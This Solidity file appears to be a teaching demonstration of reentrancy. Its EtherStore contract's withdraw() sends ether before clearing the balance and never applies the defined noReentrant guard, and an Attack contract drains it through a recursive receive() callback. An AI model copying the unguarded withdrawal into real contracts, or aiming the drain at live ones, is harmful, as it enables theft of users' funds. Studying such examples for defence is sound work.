// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

contract ReEntrancyGuard {
    bool internal locked;

    modifier noReentrant() {
        require(!locked, "No re-entrancy");
        locked = true;
        _;
        locked = false;
    }
}

contract EtherStore is ReEntrancyGuard {
    mapping(address => uint) public balances;

    function deposit() public payable  {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public  {
        uint bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    EtherStore public etherStore;

    constructor(address _etherStore) {
        etherStore = EtherStore(_etherStore);
    }

    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    function deposit() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{ value: 1 ether }();
    }

    function withdraw() external {
        // when you call this, the other contract will send money to the receive()
        // the receive will call withdraw again
        // if the other contract doesn't have noreentrant it will keep calling it
        etherStore.withdraw();
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}